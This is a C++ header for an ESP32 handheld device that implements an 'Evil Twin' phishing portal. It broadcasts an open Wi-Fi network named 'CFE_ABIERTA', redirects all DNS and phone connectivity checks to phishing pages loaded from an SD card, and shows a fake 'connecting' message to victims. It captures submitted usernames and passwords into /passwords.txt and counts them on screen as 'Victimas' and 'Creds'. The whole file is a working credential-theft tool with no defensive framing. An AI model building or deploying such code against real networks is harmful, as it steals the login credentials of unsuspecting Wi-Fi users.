#ifndef APPEVILTWIN_H
#define APPEVILTWIN_H
#include "App.h"
#include "Emojis.h"
#include "ui/Launcher.h"
#include "config.h" 
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SD_MMC.h>

#define LED_PIN 48

class AppEvilTwin : public App {
private:
    enum EstadoTwin { MENU_PRINCIPAL, MENU_PORTALES, CORRIENDO, VER_CREDENCIALES };
    EstadoTwin estado = MENU_PRINCIPAL;

    // Menús
    int indiceMenuPrincipal = 0;
    String opcionesPrincipal[2] = {"1. LISTA DE PORTALES", "2. VER CREDENCIALES"};

    int indicePortal = 0;
    int totalPortales = 0;
    String nombresPortales[15]; 
    String ssidActivo = "CFE_ABIERTA"; // Nombre fijo del cebo
    String rutaPortalActivo = "";

    // Servidores (Estables)
    DNSServer dnsServer;
    WebServer server;
    const byte DNS_PORT = 53;
    IPAddress apIP;
    bool rutasRegistradas = false; 

    // Variables de intercepción
    int clientesConectados = 0;
    int totalCapturas = 0;
    String ultimaCredencial = "";

    // --- BUFFER ANTI-REINICIO ---
    volatile bool credencialPendiente = false;
    String pendingUser = "";
    String pendingPass = "";

    // Variables de UI y Hardware
    unsigned long ultimoMovimiento = 0;
    bool pantallaActualizada = false;
    bool btnAnterior = false;
    int anguloNeon = 0;
    unsigned long ultimoFrameNeon = 0;
    bool sdOk = false;

    // ==========================================
    // LÓGICA DE TARJETA SD
    // ==========================================
    void inicializarSD() {
        SD_MMC.setPins(SD_MMC_CLK, SD_MMC_CMD, SD_MMC_D0);
        sdOk = SD_MMC.begin("/sdcard", true);
        if (sdOk && !SD_MMC.exists("/portals")) {
            SD_MMC.mkdir("/portals"); 
        }
    }

    void cargarPortales() {
        totalPortales = 0;
        if (!sdOk) return;

        File dir = SD_MMC.open("/portals");
        if (!dir) return;

        File file = dir.openNextFile();
        while (file && totalPortales < 15) {
            String fileName = file.name();
            if (fileName.endsWith(".html") || fileName.endsWith(".htm")) {
                nombresPortales[totalPortales] = fileName;
                totalPortales++;
            }
            file = dir.openNextFile();
        }
        dir.close();
    }

    // Nuevo formato exacto: Nombre de portal, user, password
    void guardarCredenciales(String user, String pass) {
        if (sdOk) {
            File logFile = SD_MMC.open("/passwords.txt", FILE_APPEND);
            if (logFile) {
                // Limpiar el nombre del portal para el archivo
                String nombreLimpio = nombresPortales[indicePortal];
                nombreLimpio.replace(".html", "");
                nombreLimpio.replace(".htm", "");

                logFile.print(nombreLimpio);
                logFile.print(", ");
                logFile.print(user);
                logFile.print(", ");
                logFile.println(pass);
                logFile.close();
                totalCapturas++;
            }
        }
    }

    void leerUltimaCredencial() {
        ultimaCredencial = "";
        if (sdOk) {
            File logFile = SD_MMC.open("/passwords.txt", FILE_READ);
            if (logFile) {
                while (logFile.available()) {
                    ultimaCredencial = logFile.readStringUntil('\n'); 
                }
                logFile.close();
            } else {
                ultimaCredencial = "NO HAY LOGS";
            }
        } else {
            ultimaCredencial = "ERROR SD";
        }
    }

    // ==========================================
    // LÓGICA DE EVIL TWIN / PORTAL ANTI-CRASH
    // ==========================================
    void iniciarPortal(int index) {
        rutaPortalActivo = "/portals/" + nombresPortales[index];
        ssidActivo = "CFE_ABIERTA"; 

        apIP = IPAddress(192, 168, 4, 1);
        WiFi.mode(WIFI_AP);
        WiFi.softAP(ssidActivo.c_str(), ""); 
        delay(100); 
        WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

        dnsServer.start(DNS_PORT, "*", apIP); 

        if (!rutasRegistradas) {
            
            // Lector de la SD (Se ejecuta solo cuando se pide la raíz /)
            auto servePortal = [this]() {
                if (sdOk) {
                    File file = SD_MMC.open(rutaPortalActivo, FILE_READ);
                    if (file) {
                        server.streamFile(file, "text/html");
                        file.close();
                        return;
                    }
                }
                server.send(200, "text/html", "<h1>Error SD</h1>");
            };

            // Captura asíncrona de datos
            auto handleAuth = [this]() {
                String u = server.hasArg("user") ? server.arg("user") : server.arg("email");
                String p = server.hasArg("pass") ? server.arg("pass") : server.arg("password");
                
                if (u.length() > 0 || p.length() > 0) {
                    // Pasar al Buffer (Evita el congelamiento y reinicio)
                    pendingUser = u;
                    pendingPass = p;
                    credencialPendiente = true; 
                    
                    server.sendHeader("Connection", "close"); // Liberar al cliente rápido
                    server.send(200, "text/html", "<html><body><h2>Actualizando...</h2><p>Conectando dispositivo a la red segura.</p></body></html>");
                } else {
                    server.send(200, "text/html", "Datos invalidos.");
                }
            };

            // Solución a la inundación de SD: Todo lo perdido va al inicio
            server.onNotFound([this]() {
                server.sendHeader("Location", "http://192.168.4.1/", true);
                server.send(302, "text/plain", "");
            });

            // Direcciones base e inyectores para Android/Apple
            server.on("/", servePortal);
            server.on("/generate_204", servePortal);
            server.on("/hotspot-detect.html", servePortal);
            
            server.on("/auth", HTTP_POST, handleAuth);
            server.on("/auth", HTTP_GET, handleAuth);
            server.on("/login", HTTP_POST, handleAuth);
            server.on("/get", handleAuth);

            rutasRegistradas = true;
        }

        server.begin();
        totalCapturas = 0;
        clientesConectados = 0;
        credencialPendiente = false;
    }

    void detenerPortal() {
        dnsServer.stop(); 
        server.stop(); 
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_STA); 
        WiFi.disconnect();
    }

public:
    AppEvilTwin() : server(80) {} 

    const char* obtenerNombre() override { return "EVIL PORTAL"; }
    const uint8_t* obtenerEmoji() override { return emoji_evilportal; } 
    
    void setup() override {}

    void alEntrar() override {
        estado = MENU_PRINCIPAL;
        indiceMenuPrincipal = 0;
        anguloNeon = 0;
        ultimoFrameNeon = millis();
        ultimoMovimiento = millis();
        pantallaActualizada = false;
        btnAnterior = (digitalRead(JOY_SW) == LOW);
        neopixelWrite(LED_PIN, 0, 0, 0); 
        
        inicializarSD();
    }
    
    void alSalir() override {
        if (estado == CORRIENDO) detenerPortal();
        if (sdOk) SD_MMC.end();
        neopixelWrite(LED_PIN, 0, 0, 0); 
    }

    void loop(Arduino_Canvas* canvas) override {
        int valVert = joyEjeY_esVertical ? analogRead(JOY_Y) : analogRead(JOY_X);
        bool arriba = joyInvVertical ? (valVert > 3200) : (valVert < 800);
        bool abajo = joyInvVertical ? (valVert < 800) : (valVert > 3200);
        bool botonAhora = (digitalRead(JOY_SW) == LOW);
        bool clicSimple = (botonAhora && !btnAnterior);

        // --- ANIMACIÓN NEÓN ---
        if (millis() - ultimoFrameNeon > 30) {
            anguloNeon = (anguloNeon + 8) % 360; 
            ultimoFrameNeon = millis();
            pantallaActualizada = false; 
        }

        // --- EJECUCIÓN DEL SERVIDOR Y SD SEGURO ---
        if (estado == CORRIENDO) {
            dnsServer.processNextRequest();
            server.handleClient();

            int clientesNuevos = WiFi.softAPgetStationNum();
            if (clientesNuevos != clientesConectados) {
                clientesConectados = clientesNuevos;
                pantallaActualizada = false; 
            }

            // GUARDAR DATOS EN EL TIEMPO LIBRE (Evita el WDT Reset)
            if (credencialPendiente) {
                guardarCredenciales(pendingUser, pendingPass);
                neopixelWrite(LED_PIN, 0, 255, 0); // Disparo verde al capturar
                pantallaActualizada = false;
                credencialPendiente = false;
            }
        }

        // --- NAVEGACIÓN ---
        if (estado == MENU_PRINCIPAL) {
            if (millis() - ultimoMovimiento > 200) {
                if (arriba) { indiceMenuPrincipal--; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (abajo)  { indiceMenuPrincipal++; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (indiceMenuPrincipal < 0) indiceMenuPrincipal = 1;
                if (indiceMenuPrincipal > 1) indiceMenuPrincipal = 0;
            }

            if (clicSimple) {
                if (indiceMenuPrincipal == 0) { 
                    estado = MENU_PORTALES; 
                    indicePortal = 0; 
                    cargarPortales(); 
                }
                if (indiceMenuPrincipal == 1) { 
                    estado = VER_CREDENCIALES; 
                    leerUltimaCredencial(); 
                }
                pantallaActualizada = false;
            }
        } 
        else if (estado == MENU_PORTALES) {
            if (millis() - ultimoMovimiento > 200 && totalPortales > 0) {
                if (arriba) { indicePortal--; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (abajo)  { indicePortal++; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (indicePortal < 0) indicePortal = totalPortales - 1;
                if (indicePortal >= totalPortales) indicePortal = 0;
            }

            if (clicSimple) {
                if (totalPortales > 0) {
                    estado = CORRIENDO;
                    iniciarPortal(indicePortal);
                } else {
                    estado = MENU_PRINCIPAL; 
                }
                pantallaActualizada = false;
            }
        }
        else if (estado == CORRIENDO || estado == VER_CREDENCIALES) {
            if (clicSimple) {
                if (estado == CORRIENDO) detenerPortal();
                estado = MENU_PRINCIPAL;
                neopixelWrite(LED_PIN, 0, 0, 0);
                pantallaActualizada = false;
            }
        }

        // --- RENDERIZADO VISUAL ---
        if (!pantallaActualizada) {
            canvas->fillScreen(BLACK);

            if (estado == MENU_PRINCIPAL) {
                canvas->drawCircle(120, 120, 118, IRON_CYAN);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, IRON_BLUE); 
                
                Launcher::dibujarTextoCentrado(canvas, "EVIL TWIN PORTAL", 40, 1, IRON_CYAN);
                canvas->drawLine(20, 50, 220, 50, IRON_DARK);

                for (int i = 0; i < 2; i++) {
                    int yPos = 90 + (i * 35);
                    
                    if (i == indiceMenuPrincipal) {
                        canvas->fillRoundRect(15, yPos - 12, 210, 24, 3, IRON_RED);
                        canvas->fillTriangle(20, yPos-4, 20, yPos+4, 25, yPos, WHITE);
                        Launcher::dibujarTextoCentrado(canvas, opcionesPrincipal[i].c_str(), yPos - 3, 1, WHITE);
                    } else {
                        Launcher::dibujarTextoCentrado(canvas, opcionesPrincipal[i].c_str(), yPos - 3, 1, IRON_BLUE);
                    }
                }
            } 
            else if (estado == MENU_PORTALES) {
                canvas->drawCircle(120, 120, 118, IRON_CYAN);
                Launcher::dibujarTextoCentrado(canvas, "SELECCIONAR PORTAL", 35, 1, IRON_CYAN);
                canvas->drawLine(20, 45, 220, 45, IRON_DARK);

                if (!sdOk || totalPortales == 0) {
                    Launcher::dibujarTextoCentrado(canvas, sdOk ? "Carpeta /portals vacia" : "Error SD Card", 110, 1, IRON_RED);
                } else {
                    int inicio = indicePortal - 1;
                    if (inicio < 0) inicio = 0;
                    if (totalPortales > 3 && inicio > totalPortales - 3) inicio = totalPortales - 3;

                    for (int i = 0; i < 3 && (inicio + i) < totalPortales; i++) {
                        int idx = inicio + i;
                        int yPos = 70 + (i * 35);

                        canvas->setTextSize(1);
                        canvas->setCursor(30, yPos);
                        
                        String nombreVista = nombresPortales[idx];
                        nombreVista.replace(".html", ""); 
                        nombreVista.replace(".htm", "");

                        if (idx == indicePortal) {
                            canvas->fillRoundRect(15, yPos - 10, 210, 25, 3, IRON_RED);
                            canvas->fillTriangle(20, yPos-2, 20, yPos+6, 25, yPos+2, WHITE);
                            canvas->setTextColor(WHITE);
                        } else {
                            canvas->setTextColor(IRON_BLUE);
                        }

                        canvas->print(nombreVista.substring(0, 18));
                    }
                }
            }
            else if (estado == CORRIENDO) {
                uint16_t colorHUD = (clientesConectados > 0) ? IRON_GREEN : IRON_RED;
                canvas->drawCircle(120, 120, 118, colorHUD); 
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, WHITE); 
                
                Launcher::dibujarTextoCentrado(canvas, "GEMELO ACTIVO", 35, 1, colorHUD);
                canvas->drawLine(30, 45, 210, 45, IRON_DARK);

                Launcher::dibujarTextoCentrado(canvas, "Red Falsa (SSID):", 65, 1, IRON_BLUE);
                Launcher::dibujarTextoCentrado(canvas, ssidActivo.c_str(), 85, 2, WHITE);
                
                char buf[32]; sprintf(buf, "Victimas: %d", clientesConectados);
                Launcher::dibujarTextoCentrado(canvas, buf, 120, 1, (clientesConectados > 0) ? IRON_GREEN : IRON_CYAN);
                
                sprintf(buf, "Creds: %d", totalCapturas);
                Launcher::dibujarTextoCentrado(canvas, buf, 140, 1, IRON_CYAN);

                Launcher::dibujarTextoCentrado(canvas, "< Clic = Detener", 175, 1, IRON_DARK);

                if (clientesConectados > 0) neopixelWrite(LED_PIN, 0, 255, 0); 
                else neopixelWrite(LED_PIN, 255, 0, 0); 
            }
            else if (estado == VER_CREDENCIALES) {
                canvas->drawCircle(120, 120, 118, IRON_GREEN);
                Launcher::dibujarTextoCentrado(canvas, "ULTIMA CAPTURA", 45, 1, IRON_GREEN);
                canvas->drawLine(30, 55, 210, 55, IRON_DARK);
                
                canvas->setTextSize(1);
                canvas->setTextColor(WHITE);
                
                if(ultimaCredencial.length() > 22) {
                    canvas->setCursor(15, 90); canvas->print(ultimaCredencial.substring(0, 22));
                    canvas->setCursor(15, 110); canvas->print(ultimaCredencial.substring(22, 44));
                    canvas->setCursor(15, 130); canvas->print(ultimaCredencial.substring(44));
                } else {
                    Launcher::dibujarTextoCentrado(canvas, ultimaCredencial.c_str(), 100, 1, WHITE);
                }
                
                Launcher::dibujarTextoCentrado(canvas, "< Clic = Volver", 175, 1, IRON_DARK);
            }

            // --- INSTRUCCIÓN DE SALIDA RESTAURADA ---
            if(estado == MENU_PRINCIPAL || estado == MENU_PORTALES) {
                canvas->drawBitmap(120 - 45, 200, emoji_back, 32, 32, IRON_CYAN);
                canvas->setCursor(120 - 25, 212);
                canvas->setTextColor(IRON_RED);
                canvas->print("DOBLE CLICK");
            }

            canvas->flush();
            pantallaActualizada = true;
        }

        btnAnterior = botonAhora;
        delay(10);
    }
};
#endif